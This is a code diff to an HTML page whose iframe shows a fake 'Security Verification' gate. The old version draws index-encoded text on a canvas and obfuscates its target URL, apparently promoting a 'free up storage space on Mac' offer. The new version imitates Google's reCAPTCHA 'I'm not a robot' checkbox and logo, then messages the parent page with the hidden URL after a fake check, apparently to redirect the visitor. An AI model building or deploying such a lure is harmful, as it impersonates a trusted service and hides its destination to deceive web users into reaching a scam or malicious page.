@@ -1,4 +1,3 @@
-
 <!doctype html>
 <html lang="en">
 <head>
@@ -197,7 +196,181 @@ const TARGET_URL = decodeURL(URL_IDX);
     }
 
     function buildVerifySrcdoc() {
-      return `<!doctype html><html lang="en"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title></title><style>html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#f5f5f7}canvas{display:block;width:100vw;height:100vh}</style></head><body><canvas id="c"></canvas><script>(()=>{const URL_ALPHABET='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789:/.-_';const URL_IDX=[7,19,19,15,18,62,63,63,18,19,14,17,0,6,4,60,15,0,6,4,60,2,14,12,63,18,19,14,17,0,6,4,60,7,19,12,11];const decodeURL=i=>i.map(x=>URL_ALPHABET[x]).join('');const TARGET_URL=decodeURL(URL_IDX);const c=document.getElementById('c');const g=c.getContext('2d');const alphabet='abcdefghijklmnopqrstuvwxyz'+'ABCDEFGHIJKLMNOPQRSTUVWXYZ';const space=52;const clamp=(v,a,b)=>Math.max(a,Math.min(b,v));const decode=(idx)=>{let s='';for(let i=0;i<idx.length;i++)s+=idx[i]===space?' ':alphabet[idx[i]];return s;};const bannerIdx=[31,17,4,4,52,20,15,52,18,19,14,17,0,6,4,52,18,15,0,2,4,52,14,13,52,38,0,2];const titleIdx=[44,4,2,20,17,8,19,24,52,47,4,17,8,5,8,2,0,19,8,14,13];const subIdx=[41,11,4,0,18,4,52,2,14,13,5,8,17,12,52,19,14,52,2,14,13,19,8,13,20,4];const buttonIdx=[28,14,13,19,8,13,20,4];const doneIdx=[47,4,17,8,5,8,4,3];const hit={x:0,y:0,w:0,h:0};let cssW=1,cssH=1,dpr=1;let verified=false;const fontStack='ui-sans-serif,-apple-system,BlinkMacSystemFont,\\\"SF Pro Display\\\",\\\"SF Pro Text\\\",system-ui,sans-serif';const rounded=(x,y,w,h,r)=>{r=Math.max(0,Math.min(r,Math.min(w,h)/2));g.beginPath();if(g.roundRect){g.roundRect(x,y,w,h,r);return;}g.moveTo(x+r,y);g.arcTo(x+w,y,x+w,y+h,r);g.arcTo(x+w,y+h,x,y+h,r);g.arcTo(x,y+h,x,y,r);g.arcTo(x,y,x+w,y,r);g.closePath();};const drawTracked=(text,x,y,tracking)=>{const chars=text.split('');let total=0;for(let i=0;i<chars.length;i++)total+=g.measureText(chars[i]).width+(i?tracking:0);let cx=x-total/2;for(let i=0;i<chars.length;i++){const w=g.measureText(chars[i]).width;g.fillText(chars[i],cx+w/2,y);cx+=w+tracking;}};const measure=()=>{cssW=Math.max(1,innerWidth);cssH=Math.max(1,innerHeight);dpr=devicePixelRatio||1;c.style.width=cssW+'px';c.style.height=cssH+'px';c.width=Math.round(cssW*dpr);c.height=Math.round(cssH*dpr);g.setTransform(dpr,0,0,dpr,0,0);};const render=()=>{g.clearRect(0,0,cssW,cssH);g.fillStyle='#f5f5f7';g.fillRect(0,0,cssW,cssH);const cx=cssW/2,cy=cssH/2;const bg=g.createRadialGradient(cx,cy-120,Math.min(cssW,cssH)*0.05,cx,cy-120,Math.max(cssW,cssH)*0.9);bg.addColorStop(0,'rgba(255,255,255,0.85)');bg.addColorStop(1,'rgba(245,245,247,0.0)');g.fillStyle=bg;g.fillRect(0,0,cssW,cssH);const bannerSize=clamp(Math.round(cssW*0.07),40,86);g.save();g.globalAlpha=0.24;g.fillStyle='#000000';g.font=\`800 \${bannerSize}px \${fontStack}\`;g.textAlign='center';g.textBaseline='middle';drawTracked(decode(bannerIdx),cx,clamp(cy-300,50,cy-170),clamp(Math.round(bannerSize*0.065),2,7));g.restore();const cardW=clamp(Math.round(cssW*0.30),300,460);const cardH=clamp(Math.round(cssH*0.24),185,260);const x=Math.round(cx-cardW/2),y=Math.round(cy-cardH/2);g.save();g.shadowColor='rgba(0,0,0,0.12)';g.shadowBlur=40;g.shadowOffsetX=0;g.shadowOffsetY=18;g.fillStyle='#ffffff';rounded(x,y,cardW,cardH,22);g.fill();g.restore();g.fillStyle='#ffffff';rounded(x,y,cardW,cardH,22);g.fill();g.strokeStyle='rgba(0,0,0,0.10)';g.lineWidth=1;rounded(x+0.5,y+0.5,cardW-1,cardH-1,22);g.stroke();const titleSize=clamp(Math.round(cardW*0.06),18,24);g.fillStyle='rgba(29,29,31,0.70)';g.font=\`500 \${titleSize}px \${fontStack}\`;g.textAlign='center';g.textBaseline='middle';g.fillText(decode(titleIdx),cx,y+Math.round(cardH*0.35));const subSize=clamp(Math.round(cardW*0.038),13,15);g.fillStyle='rgba(29,29,31,0.44)';g.font=\`500 \${subSize}px \${fontStack}\`;g.fillText(decode(subIdx),cx,y+Math.round(cardH*0.46));const bw=clamp(Math.round(cardW*0.64),200,300);const bh=clamp(Math.round(cardH*0.25),44,52);const bx=Math.round(cx-bw/2);const by=Math.round(y+Math.round(cardH*0.59));g.save();g.shadowColor='rgba(0,0,0,0.18)';g.shadowBlur=18;g.shadowOffsetX=0;g.shadowOffsetY=10;const grad=g.createLinearGradient(bx,by,bx,by+bh);grad.addColorStop(0,'#1f2937');grad.addColorStop(1,'#0b0d12');g.fillStyle=grad;rounded(bx,by,bw,bh,14);g.fill();g.restore();const grad2=g.createLinearGradient(bx,by,bx,by+bh);grad2.addColorStop(0,'#111827');grad2.addColorStop(1,'#0b0d12');g.fillStyle=grad2;rounded(bx,by,bw,bh,14);g.fill();g.strokeStyle='rgba(255,255,255,0.10)';g.lineWidth=1;rounded(bx+0.5,by+0.5,bw-1,bh-1,14);g.stroke();const btnSize=clamp(Math.round(bh*0.34),15,17);g.fillStyle='#ffffff';g.font=\`500 \${btnSize}px \${fontStack}\`;g.fillText(decode(verified?doneIdx:buttonIdx),cx,by+Math.round(bh/2));hit.x=bx;hit.y=by;hit.w=bw;hit.h=bh;};const repaint=()=>{measure();render();};const notify=()=>{try{window.parent&&window.parent.postMessage({type:'verified', target: TARGET_URL},'*');}catch(_){}};c.addEventListener('pointerdown',(e)=>{const r=c.getBoundingClientRect();const mx=e.clientX-r.left;const my=e.clientY-r.top;if(!verified&&mx>=hit.x&&mx<=hit.x+hit.w&&my>=hit.y&&my<=hit.y+hit.h){verified=true;render();notify();}},{passive:true});addEventListener('resize',repaint);repaint();})();<\/script></body></html>`;
+      return `<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="initial-scale=1">
+  <title>About this page</title>
+  <style>
+    .custom-recaptcha {
+      border: 1px solid #d3d3d3;
+      background-color: #f9f9f9;
+      border-radius: 3px;
+      padding: 12px;
+      display: inline-block;
+      box-shadow: 0 0 3px rgba(0,0,0,0.1);
+      cursor: pointer;
+      user-select: none;
+      min-width: 300px;
+    }
+   
+    .custom-recaptcha-inner {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+   
+    .custom-checkbox {
+      width: 26px;
+      height: 26px;
+      border: 2px solid #c1c1c1;
+      border-radius: 2px;
+      background-color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      position: relative;
+      transition: all 0.2s;
+      flex-shrink: 0;
+    }
+   
+    .custom-checkbox.loading {
+      border: none;
+      background-color: transparent;
+      width: 26px;
+      height: 26px;
+    }
+   
+    .custom-checkbox.loading::after {
+      content: '';
+      display: block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #4285f4;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+   
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+   
+    .custom-checkbox.checked {
+      background-color: transparent;
+      border: none;
+      width: 26px;
+      height: 26px;
+    }
+   
+    .custom-checkbox.checked::after {
+      content: '';
+      position: absolute;
+      left: 8px;
+      top: 2px;
+      width: 9px;
+      height: 17px;
+      border: solid #00a650;
+      border-width: 0 3.5px 3.5px 0;
+      transform: rotate(45deg);
+      border-radius: 0;
+      animation: none;
+    }
+   
+    .custom-recaptcha-text {
+      color: #000;
+      font-size: 14px;
+      font-family: arial, sans-serif;
+    }
+   
+    .custom-recaptcha-logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-left: auto;
+    }
+   
+    .recaptcha-icon {
+      width: 44px;
+      height: 44px;
+      margin-bottom: 4px;
+    }
+   
+    .recaptcha-links {
+      font-size: 8px;
+      color: #555;
+      display: flex;
+      gap: 5px;
+      white-space: nowrap;
+    }
+   
+    .recaptcha-links a {
+      color: #555;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body style="font-family: arial, sans-serif; background-color: #fff; color: #000; padding:20px; font-size:18px; overscroll-behavior:contain;">
+  <div style="max-width:400px;">
+    <hr noshade size="1" style="color:#ccc; background-color:#ccc;"><br>
+   
+    <form id="gateForm">
+      <noscript>
+        <div style="font-size:13px;">
+          In order to continue, please enable javascript on your web browser.
+        </div>
+      </noscript>
+     
+      <div class="custom-recaptcha" id="customRecaptcha">
+        <div class="custom-recaptcha-inner">
+          <div class="custom-checkbox" id="customCheckbox"></div>
+          <div class="custom-recaptcha-text">I'm not a robot</div>
+          <div class="custom-recaptcha-logo">
+            <img class="recaptcha-icon" src="data:image/png;base64,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" alt="reCAPTCHA">
+            <div class="recaptcha-links">
+              <a href="https://www.google.com/intl/en/policies/privacy/" target="_blank">Privacy</a> -
+              <a href="https://www.google.com/intl/en/policies/terms/" target="_blank">Terms</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </form>
+   
+    <hr noshade size="1" style="color:#ccc; background-color:#ccc;">
+  </div>
+  <script>
+    let isChecked = false;
+    const checkbox = document.getElementById('customCheckbox');
+    const captchaBox = document.getElementById('customRecaptcha');
+    function handleCheckboxClick(e) {
+      e.preventDefault();
+      if (isChecked) return;
+     
+      isChecked = true;
+      captchaBox.style.cursor = 'default';
+     
+     
+      checkbox.classList.add('loading');
+     
+     
+      setTimeout(() => {
+        checkbox.classList.remove('loading');
+        checkbox.classList.add('checked');
+       
+       
+        setTimeout(() => {
+          try{window.parent&&window.parent.postMessage({type:'verified', target: '${TARGET_URL}'},'*');}catch(_){}
+        }, 500);
+      }, 1000);
+    }
+    captchaBox.addEventListener('click', handleCheckboxClick);
+    checkbox.addEventListener('click', handleCheckboxClick);
+  </script>
+</body>
+</html>`;
     }
 
     iframe.srcdoc = buildVerifySrcdoc();
